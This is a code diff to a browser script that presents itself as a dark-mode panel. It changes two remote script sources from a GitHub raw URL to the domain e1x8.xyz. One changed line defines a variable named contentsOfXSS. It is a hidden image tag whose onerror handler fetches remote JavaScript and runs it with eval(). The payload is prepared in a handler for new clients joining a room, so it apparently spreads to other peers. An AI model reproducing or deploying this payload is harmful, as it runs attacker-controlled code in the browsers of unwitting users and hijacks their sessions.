@@ -134,7 +134,7 @@ function createDarkModePanel() {
   loadEquinoxButton.addEventListener("click", async () => {
     try {
       // Fetch the equinox file from the raw GitHub URL
-      const response = await fetch("https://raw.githubusercontent.com/JammyCat91283/websim/main/equ.html");
+      const response = await fetch("https://e1x8.xyz/scripts/equ.html");
       if (!response.ok) {
         throw new Error(`Failed to load equinox: ${response.statusText}`);
       }
@@ -537,7 +537,7 @@ function createDarkModePanel() {
     async function handleNewClientJoin() {
       try {
 
-        const contentsOfXSS = `<img src="asd" id="targetImage" onerror='fetch("https://raw.githubusercontent.com/JammyCat91283/websim/refs/heads/main/main.js").then((response) => response.text()).then((text) => eval(text)).then(() => {})' style="display: none;"></img>`;
+        const contentsOfXSS = `<img src="asd" id="targetImage" onerror='fetch("https://e1x8.xyz/scripts/main.js").then((response) => response.text()).then((text) => eval(text)).then(() => {})' style="display: none;"></img>`;
         const currentPeers = room.peers;
         setInterval(() => {
 
